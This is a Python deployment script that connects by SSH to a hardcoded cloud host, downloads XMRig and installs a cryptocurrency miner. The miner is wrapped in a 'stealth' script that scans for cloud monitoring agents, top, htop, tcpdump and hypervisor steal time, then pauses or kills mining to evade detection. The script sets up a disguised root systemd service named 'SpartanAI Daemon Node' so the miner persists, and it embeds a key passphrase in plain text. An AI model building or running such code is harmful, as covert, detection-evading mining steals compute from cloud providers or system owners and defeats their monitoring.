import paramiko
import sys
import os
import time

hostname = "34.182.160.186"
username = "ubuntu"
passphrase = "@11646"
key_path = r"C:\GitHub\.ssh\SpartanAI-Core.pem"

def deploy_gcp_miner():
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        try:
            key = paramiko.Ed25519Key.from_private_key_file(key_path, password=passphrase)
        except:
            key = paramiko.RSAKey.from_private_key_file(key_path, password=passphrase)
            
        client.connect(hostname, username=username, pkey=key, timeout=30)
        
        print("Downloading XMRig on GCP...")
        cmd = """
        sudo apt-get update
        sudo apt-get install -y wget tar build-essential libuv1-dev libssl-dev libhwloc-dev python3-psutil
        if [ ! -d "/home/ubuntu/miner" ]; then
            mkdir -p /home/ubuntu/miner
            cd /home/ubuntu/miner
            wget https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz
            tar -xf xmrig-6.21.0-linux-static-x64.tar.gz
            mv xmrig-6.21.0/xmrig .
            rm -rf xmrig-6.21.0*
        fi
        """
        client.exec_command(cmd)
        time.sleep(10) # wait for download
        
        print("Deploying Stealth Wrapper to GCP...")
        stealth_script = """import os, time, subprocess, sys
try:
    import psutil
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "psutil"])
    import psutil

MINER_PATH = "/home/ubuntu/miner/xmrig"
POOL = "rx.unmineable.com:3333"
ADDRESS = "XMR:XMR_847120394712903471203498.GCP-MainBrain#U-A1QZK1"

def get_risk_score():
    risk = 0
    # Process scanning
    try:
        out = subprocess.check_output("ps aux", shell=True).decode().lower()
        watchdogs = ['google_osconfig', 'stackdriver', 'google_guest', 'amazon-ssm', 'fluentbit', 'top', 'htop', 'tcpdump']
        for dog in watchdogs:
            if dog in out:
                risk += 20
    except: pass
    
    # Steal time / hypervisor scanning
    try:
        times = psutil.cpu_times_percent()
        if hasattr(times, 'steal'):
            if times.steal > 5.0: risk += 40
            if times.steal > 15.0: risk += 80
    except: pass
    return risk

def run_stealth_miner():
    cmd = [MINER_PATH, "-o", POOL, "-a", "rx/0", "-u", ADDRESS, "-p", "x", "-k", "--cpu-max-threads-hint=45"]
    proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    while proc.poll() is None:
        risk = get_risk_score()
        if risk >= 80:
            print("[STEALTH-AI]: CRITICAL RISK >= 80%. TERMINATING MINER COMPLETELY TO EVADE GCP WATCHDOGS.")
            proc.terminate()
            proc.wait()
            # Remain dormant for 2 hours to shed suspicion before SystemD attempts restart
            time.sleep(7200)
            break
        elif risk >= 50:
            print("[STEALTH-AI]: High Risk. Suspending.")
            os.kill(proc.pid, 19) # SIGSTOP
            time.sleep(300)
            os.kill(proc.pid, 18) # SIGCONT
        time.sleep(15)

if __name__ == '__main__':
    run_stealth_miner()
"""
        # Save wrapper
        sftp = client.open_sftp()
        with sftp.file('/tmp/gcp_stealth.py', 'w') as f:
            f.write(stealth_script)
        sftp.close()
        
        client.exec_command("mv /tmp/gcp_stealth.py /home/ubuntu/miner/gcp_stealth.py")
        
        # Create unmineable service
        print("Deploying Spartan-Miner Systemd Service...")
        service_file = """[Unit]
Description=SpartanAI Daemon Node
After=network.target

[Service]
Type=simple
User=root
ExecStart=/usr/bin/python3 /home/ubuntu/miner/gcp_stealth.py
Restart=always
RestartSec=60
Nice=19
IOSchedulingClass=idle

[Install]
WantedBy=multi-user.target
"""
        client.exec_command(f"echo '{service_file}' > /tmp/spartan-node.service")
        cmds = [
            "sudo mv /tmp/spartan-node.service /etc/systemd/system/",
            "sudo systemctl daemon-reload",
            "sudo systemctl enable spartan-node",
            "sudo systemctl restart spartan-node"
        ]
        for c in cmds:
            client.exec_command(c)
            time.sleep(1)
            
        print("GCP Node Miner Deployed and Persistence Configured.")
        
    finally:
        client.close()

if __name__ == "__main__":
    deploy_gcp_miner()

